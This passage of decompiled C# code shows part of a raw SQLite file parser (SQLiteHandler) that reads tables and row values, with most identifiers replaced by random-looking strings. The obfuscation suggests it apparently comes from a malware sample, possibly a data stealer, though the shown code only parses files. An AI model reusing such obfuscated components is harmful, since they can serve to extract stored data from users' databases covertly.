					long num7 = xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0((int)num4, num5);
					long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
					int num9 = 0;
					while (num8 < num7)
					{
						array = (ZN6nysfuVqOR0ejmUpTovsRkKAejmUpTovsRkKAWBHCRGH6tAJyARXvtbU56WbuA[])Utils.CopyArray((Array)array, (Array)new ZN6nysfuVqOR0ejmUpTovsRkKAejmUpTovsRkKAWBHCRGH6tAJyARXvtbU56WbuA[num9 + 1]);
						num5 = num6 + 1;
						num6 = method_0(num5);
						array[num9].type = xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0(num5, num6);
						if (array[num9].type > 9L)
						{
							if (lRQNCcJDc1JS8lRQNCcJDc1JSAUHikvOw0Q0V4AYEePmcs1nCfzAYEePmcs1nCfA(array[num9].type))
							{
								array[num9].size = (long)Math.Round((double)(array[num9].type - 13L) / 2.0);
							}
							else
							{
								array[num9].size = (long)Math.Round((double)(array[num9].type - 12L) / 2.0);
							}
						}
						else
						{
							array[num9].size = EXLuokt7J1V94uArFHXBKXeuo0pK8K760KuCD5ApK8K760KuCD5ANoigrXl7rQaA[(int)array[num9].type];
						}
						num8 = num8 + (num6 - num5) + 1L;
						num9++;
					}
					S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[num2 + i].content = new string[array.Length - 1 + 1];
					int num10 = 0;
					int num11 = array.Length - 1;
					for (int j = 0; j <= num11; j++)
					{
						if (array[j].type > 9L)
						{
							if (!lRQNCcJDc1JS8lRQNCcJDc1JSAUHikvOw0Q0V4AYEePmcs1nCfzAYEePmcs1nCfA(array[j].type))
							{
								if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), 1m) == 0)
								{
									S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[num2 + i].content[j] = Encoding.Default.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
								else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(2L)) == 0)
								{
									S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[num2 + i].content[j] = Encoding.Unicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
								else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(3L)) == 0)
								{
									S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
							}
							else
							{
								S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[num2 + i].content[j] = Encoding.Default.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
							}
						}
						else
						{
							S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[num2 + i].content[j] = Conversions.ToString(c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size));
						}
						num10 = (int)(num10 + array[j].size);
					}
				}
			}
			else if (rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[(int)P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA] == 5)
			{
				ushort num12 = (ushort)(unchecked((int)IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(new decimal(P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA), new decimal(3L)))))) - 1);
				int num13 = num12;
				for (int k = 0; k <= num13; k++)
				{
					ushort num14 = IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA), new decimal(12L)), new decimal(k * 2)))));
					yTMiYnW3MHObCyTMiYnW3MHObACwV2ZabGasPEAHGW6O9RGySkXAHGW6O9RGySk0(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0((int)(P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA + num14), 4)), 1m), new decimal(VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0))));
				}
				yTMiYnW3MHObCyTMiYnW3MHObACwV2ZabGasPEAHGW6O9RGySkXAHGW6O9RGySk0(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(Convert.ToInt32(decimal.Add(new decimal(P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA), new decimal(8L))), 4)), 1m), new decimal(VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0))));
			}
			return true;
		}
	}

	public bool ReadTable(string TableName)
	{
		int num = -1;
		int num2 = rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0.Length;
		checked
		{
			for (int i = 0; i <= num2; i++)
			{
				if (rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return false;
			}
			string[] array = rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num].sql_statement.Substring(rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num].sql_statement.IndexOf("(") + 1).Split(new char[1] { ',' });
			int num3 = array.Length - 1;
			for (int j = 0; j <= num3; j++)
			{
				array[j] = Strings.LTrim(array[j]);
				int num4 = array[j].IndexOf(" ");
				if (num4 > 0)
				{
					array[j] = array[j].Substring(0, num4);
				}
				if (array[j].IndexOf("UNIQUE") == 0)
				{
					break;
				}
				bRO6OJF9i8Uq6gNdCEX39sjl70gNdCEX39sjl7AUE7YxJQMhJoOAPBnEoueM4tPA = (string[])Utils.CopyArray((Array)bRO6OJF9i8Uq6gNdCEX39sjl70gNdCEX39sjl7AUE7YxJQMhJoOAPBnEoueM4tPA, (Array)new string[j + 1]);
				bRO6OJF9i8Uq6gNdCEX39sjl70gNdCEX39sjl7AUE7YxJQMhJoOAPBnEoueM4tPA[j] = array[j];
			}
			return yTMiYnW3MHObCyTMiYnW3MHObACwV2ZabGasPEAHGW6O9RGySkXAHGW6O9RGySk0((ulong)((rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num].root_num - 1L) * unchecked((long)VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0)));
		}
	}

	public int GetRowCount()
	{
		return S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0.Length;
	}

	public string GetValue(int row_num, int field)
	{
		if (row_num >= S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0.Length)
		{
			return null;
		}
		if (field >= S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[row_num].content.Length)
		{
			return null;
		}
		return S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[row_num].content[field];
	}

	public string GetValue(int row_num, string field)
	{
		int num = -1;
		int num2 = bRO6OJF9i8Uq6gNdCEX39sjl70gNdCEX39sjl7AUE7YxJQMhJoOAPBnEoueM4tPA.Length;
		for (int i = 0; i <= num2; i = checked(i + 1))
		{
			if (bRO6OJF9i8Uq6gNdCEX39sjl70gNdCEX39sjl7AUE7YxJQMhJoOAPBnEoueM4tPA[i].ToLower().CompareTo(field.ToLower()) == 0)
			{
				num = i;
				break;
			}
		}
		if (num == -1)
		{
			return null;
		}
		return GetValue(row_num, num);
	}

	public string[] GetTableNames()
	{
		int num = 0;
		checked
		{
			int num2 = rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0.Length - 1;
			string[] array = default(string[]);
			for (int i = 0; i <= num2; i++)
			{
				if (Operators.CompareString(rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[i].item_type, "table", false) == 0)
				{
					array = (string[])Utils.CopyArray((Array)array, (Array)new string[num + 1]);
					array[num] = rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[i].item_name;
					num++;
				}
			}
			return array;
		}
	}

	public SQLiteHandler(string baseName)
	{
		EXLuokt7J1V94uArFHXBKXeuo0pK8K760KuCD5ApK8K760KuCD5ANoigrXl7rQaA = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
		if (!File.Exists(baseName))
		{
			return;
		}
		FileSystem.FileOpen(1, baseName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		string s = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref s, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA = Encoding.Default.GetBytes(s);
		if (Encoding.Default.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, 0, 15).CompareTo("SQLite format 3") == 0 && rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[52] == 0 && (long)i94Dx0jykSoP4X0mZ8SN9YRk2AbyFeN1D9EAULAbyFeN1D9EAULAZScyjpwyScuA(checked((uint)BitConverter.ToInt32(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, 44))) < 4L)
		{
			VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0 = checked((ushort)c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(16, 2));
			j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA = c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(56, 4);
			if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), 0m) == 0)
			{
				j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA = 1uL;
			}
			mq1FINN2nZfUBNKocxBtFzXt6A2fCHrNvFc521A2fCHrNvFc521Au7f0OB12OilA(100uL);
		}
	}
}
